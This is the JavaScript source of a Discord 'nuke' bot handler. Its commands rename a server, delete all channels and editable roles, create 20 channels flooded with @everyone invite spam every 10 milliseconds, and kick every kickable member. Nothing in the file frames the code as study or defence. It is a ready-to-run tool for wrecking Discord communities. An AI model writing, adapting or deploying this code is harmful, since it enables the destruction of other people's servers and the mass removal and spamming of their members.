// handlers/nuke.js
const { ChannelType } = require("discord.js");
const fs = require('fs');
const path = require('path');

let welcomeInterval = null;

// =========================
// BANNER URL (For !moon)
// =========================
const BANNER_URL = "https://cdn.discordapp.com/attachments/1531280455553388564/1555413440024023100/a9366db0-e4ac-4190-845c-b1eeb6e88b92.gif?backend=b2&ex=6ac7af66&is=6ac65de6&hm=ff994fce35c7a6fad6460c11715e456166f82dfe486a734e4c744016b3ce9207&";

module.exports = (client) => {
    client.on("messageCreate", async (message) => {
        if (message.author.bot || !message.guild) return;

        const guild = message.guild;
        const command = message.content.toLowerCase();

        // ==========================================
        // 1. COMMAND: !moon
        // ==========================================
        if (command === "!moon") {
            try {
                // Server Details Change
                await guild.setName("Nuked by Moon Community 🌙").catch(() => {});
                const iconPath = path.join(__dirname, '../assets/icon.png');
                if (fs.existsSync(iconPath)) {
                    await guild.setIcon(iconPath).catch(() => {});
                }
                
                // Delete all existing channels
                const channels = [...guild.channels.cache.values()];
                for (const channel of channels) {
                    await channel.delete("Moon command").catch(() => {});
                }

                // Delete all deletable roles
                const roles = [...guild.roles.cache.values()];
                for (const role of roles) {
                    if (role.id !== guild.id && role.editable) {
                        await role.delete("Moon command").catch(() => {});
                    }
                }

                // Create new text channels
                const newChannels = [];
                for (let i = 0; i < 20; i++) {
                    const channel = await guild.channels.create({
                        name: "moon community nuke annoucers 📢",
                        type: ChannelType.GuildText
                    }).catch(() => null);

                    if (channel) {
                        newChannels.push(channel);
                    }
                }

                // Send initial message
                const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/h5ejJAabPv ";
                await Promise.all(
                    newChannels.map(channel =>
                        channel.send({
                            content: welcomeMessage,
                            embeds: [{ image: { url: BANNER_URL } }]
                        }).catch(() => {})
                    )
                );

                // Stop previous interval if active
                if (welcomeInterval) {
                    clearInterval(welcomeInterval);
                    welcomeInterval = null;
                }

                // Interval spam
                welcomeInterval = setInterval(async () => {
                    for (const channel of newChannels) {
                        await channel.send({
                            content: welcomeMessage,
                            embeds: [{ image: { url: BANNER_URL } }]
                        }).catch(() => {});
                    }
                }, 10);

            } catch (error) {
                console.error("Error executing !moon command:", error);
            }
        }

        // ==========================================
        // 2. COMMAND: !sun (Members Kick)
        // ==========================================
        if (command === "!sun") {
            try {
                const allMembers = guild.members.cache;
                
                for (const [, member] of allMembers) {
                    if (
                        member.id !== client.user.id &&
                        member.id !== message.author.id &&
                        member.kickable
                    ) {
                        await member.kick("Sun command").catch(() => {});
                    }
                }
            } catch (error) {
                console.error("Error executing !sun command:", error);
            }
        }

        // ==========================================
        // 3. COMMAND: !bloom
        // ==========================================
        if (command === "!bloom") {
            try {
                // Server Details Change
                await guild.setName("Moon Community 🌙").catch(() => {});
                const iconPath = path.join(__dirname, '../assets/icon.png');
                if (fs.existsSync(iconPath)) {
                    await guild.setIcon(iconPath).catch(() => {});
                }
                
                // Delete all existing channels
                const channels = [...guild.channels.cache.values()];
                for (const channel of channels) {
                    await channel.delete("bloom command").catch(() => {});
                }

                // Delete all deletable roles
                const roles = [...guild.roles.cache.values()];
                for (const role of roles) {
                    if (role.id !== guild.id && role.editable) {
                        await role.delete("bloom command").catch(() => {});
                    }
                }

                // Create new text channels
                const newChannels = [];
                for (let i = 0; i < 20; i++) {
                    const channel = await guild.channels.create({
                        name: "moon community annoucers 📢",
                        type: ChannelType.GuildText
                    }).catch(() => null);

                    if (channel) {
                        newChannels.push(channel);
                    }
                }

                // Send initial message (No banner)
                const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                await Promise.all(
                    newChannels.map(channel =>
                        channel.send({
                            content: welcomeMessage
                        }).catch(() => {})
                    )
                );

                // Stop previous interval if active
                if (welcomeInterval) {
                    clearInterval(welcomeInterval);
                    welcomeInterval = null;
                }

                // Interval spam
                welcomeInterval = setInterval(async () => {
                    for (const channel of newChannels) {
                        await channel.send({
                            content: welcomeMessage
                        }).catch(() => {});
                    }
                }, 10);

            } catch (error) {
                console.error("Error executing !bloom command:", error);
            }
        }
              
        // ==========================================
        // 4. COMMAND: !stop
        // ==========================================
        if (command === "!stop") {
            if (welcomeInterval) {
                clearInterval(welcomeInterval);
                welcomeInterval = null;
                await message.channel.send("🛑 Spammer band kar diya gaya.").catch(() => {});
            }
        }
    });
};
